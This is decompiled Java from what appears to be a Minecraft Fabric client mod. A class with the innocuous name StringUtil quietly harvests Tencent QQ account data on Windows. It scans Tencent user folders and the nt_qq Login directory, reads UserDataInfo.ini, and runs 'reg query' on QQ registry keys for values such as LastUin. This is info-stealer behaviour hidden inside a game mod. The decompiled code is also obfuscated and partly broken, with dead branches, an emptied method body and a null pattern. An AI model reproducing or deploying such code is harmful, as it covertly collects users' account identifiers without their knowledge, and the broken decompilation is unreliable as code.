/*
 * Decompiled with CFR 0.152.
 */
package shit.util;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;
import java.nio.file.DirectoryStream;
import java.nio.file.Files;
import java.nio.file.LinkOption;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.Iterator;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Locale;
import java.util.Set;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import net.fabricmc.api.EnvType;
import net.fabricmc.api.Environment;
import shit.util.Util2;

@Environment(value=EnvType.CLIENT)
public final class StringUtil {
    private static final Pattern pattern3 = null;

    private StringUtil() {
    }

    /*
     * Enabled aggressive block sorting
     */
    public static List getList12() {
        String string;
        String string2;
        LinkedHashSet linkedHashSet = new LinkedHashSet();
        boolean bl = false;
        if (!StringUtil.isSet120()) {
            return new ArrayList(linkedHashSet);
        }
        String string3 = string2 = System.getenv("APPDATA");
        StringUtil.m786(Paths.get(string3, "Tencent", "Users"), linkedHashSet, false);
        Iterator iterator = StringUtil.getSet().iterator();
        if (iterator.hasNext()) {
            Path path = (Path)iterator.next();
            StringUtil.m786(path.resolve("Tencent Files"), linkedHashSet, false);
            StringUtil.m786(path.resolve("Tencent Files (64 Bit)"), linkedHashSet, false);
            StringUtil.m786(path.resolve("Tencent Files").resolve("nt_qq").resolve("global").resolve("nt_data").resolve("Login"), linkedHashSet, true);
            string = "C:\\Users\\Public";
        } else {
            string = System.getenv("PUBLIC");
        }
        Object object = Paths.get(string, "Documents", "Tencent", "QQ", "UserDataInfo.ini");
        StringUtil.m207(object, linkedHashSet);
        linkedHashSet.addAll(StringUtil.getList11());
        return new ArrayList(linkedHashSet);
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    private static void m786(Object object, Object object2, boolean bl) {
        Path path = (Path)object;
        Set set = (Set)object2;
        boolean bl2 = bl;
        boolean bl3 = false;
        Path path2 = path;
        {}
    }

    /*
     * Unable to fully structure code
     */
    private static void m207(Object var0, Object var1_1) {
        Path path = (Path)var0;
        Set set = (Set)var1_1;
        if (!Files.isRegularFile(path, new LinkOption[0])) {
            return;
        }
        try (BufferedReader reader = Files.newBufferedReader(path, StandardCharsets.UTF_8);){
            String line;
            while ((line = reader.readLine()) != null) {
                String[] parts = line.split("=", 2);
                if (parts.length == 2 && "UserDataSavePath".equals(parts[0].trim())) {
                    StringUtil.m786(Paths.get(parts[1].trim(), new String[0]), set, false);
                }
            }
        }
        catch (Exception exception) {}
    }

    private static Set getSet() {
        HashSet<Path> hashSet;
        block6: {
            String string;
            String string2;
            String string3;
            hashSet = new HashSet<Path>();
            String string4 = System.getProperty("user.home");
            boolean bl = false;
            String string5 = string4;
            if (false) {
                if (string5 != null) {
                    hashSet.add(Paths.get(string4, "Documents"));
                }
                string5 = System.getenv("PUBLIC");
            }
            String string6 = string3 = string5;
            if (false) {
                if (string6 != null) {
                    hashSet.add(Paths.get(string3, "Documents"));
                }
                string6 = System.getenv("OneDrive");
            }
            String string7 = string2 = string6;
            if (false) {
                if (string7 != null) {
                    hashSet.add(Paths.get(string2, new String[0]));
                }
                string7 = System.getenv("OneDriveConsumer");
            }
            if ((string = string7) == null) break block6;
            hashSet.add(Paths.get(string, new String[0]));
        }
        return hashSet;
    }

    private static List getList11() {
        ArrayList<String> arrayList = new ArrayList<String>();
        String[] stringArray = new String[]{"HKCU\\Software\\Tencent\\QQ", "HKCU\\Software\\Tencent\\QQNT", "HKLM\\Software\\Tencent\\QQ", "HKCU\\Software\\WOW6432Node\\Tencent\\QQ"};
        String[] stringArray2 = new String[]{"LastUin", "UserID", "QQ", "Account", "LastLoginUin"};
        String[] stringArray3 = stringArray;
        int n = stringArray3.length;
        int n2 = 0;
        boolean bl = false;
        int n3 = n2;
        while (n3 < n) {
            String string = stringArray3[n2];
            int n4 = 0;
            String[] stringArray4 = stringArray2;
            int n5 = stringArray4.length;
            if (n4 < n5) {
                String string2 = stringArray4[n4];
                String string3 = StringUtil.m441(string, string2);
                if (false) {
                    n3 = StringUtil.m1025(string3) ? 1 : 0;
                    if (!false) continue;
                    if (n3 != 0) {
                        boolean bl2 = arrayList.contains(string3);
                        if (false && !bl2) {
                            bl2 = arrayList.add(string3);
                        }
                    }
                    ++n4;
                }
            }
            ++n2;
            break;
        }
        return arrayList;
    }

    private static String m441(Object object, Object object2) {
        block13: {
            String string = (String)object;
            String string2 = (String)object2;
            boolean bl = Util2.isAlwaysTrue();
            try {
                String string3;
                CharSequence charSequence;
                ProcessBuilder processBuilder = new ProcessBuilder("reg", "query", string, "/v", string2);
                processBuilder.redirectErrorStream(true);
                Process process = processBuilder.start();
                try (BufferedReader object3 = new BufferedReader(new InputStreamReader(process.getInputStream(), StandardCharsets.UTF_8));){
                    String string4;
                    charSequence = new StringBuilder();
                    while ((string4 = object3.readLine()) != null) {
                        ((StringBuilder)charSequence).append(string4).append('\n');
                        if (!bl) {
                            if (!bl) continue;
                        }
                        break block13;
                    }
                    string3 = charSequence.toString();
                }
                process.waitFor();
                Matcher matcher = Pattern.compile(string2 + "\\s+REG_\\w+\\s+(\\S+)").matcher(string3);
                Object object4 = matcher;
                if (!bl) {
                    if (!((Matcher)object4).find()) break block13;
                    object4 = matcher;
                }
                CharSequence charSequence2 = charSequence = ((Matcher)object4).group(1).trim();
                if (!bl) {
                    if (!StringUtil.m1025(charSequence2)) break block13;
                    charSequence2 = charSequence;
                }
                return charSequence2.toString();
            }
            catch (Exception exception) {}
        }
        return "";
    }

    /*
     * Enabled force condition propagation
     * Lifted jumps to return sites
     */
    private static boolean m1025(Object object) {
        String string = (String)object;
        boolean bl = false;
        if (string == null) return false;
        boolean bl2 = pattern3.matcher(string.trim()).matches();
        if (!false) return bl2;
        if (!bl2) return false;
        return true;
    }

    private static boolean isSet120() {
        return System.getProperty("os.name", "").toLowerCase(Locale.ROOT).contains("win");
    }

    /*
     * Unable to fully structure code
     */
    static {}
}

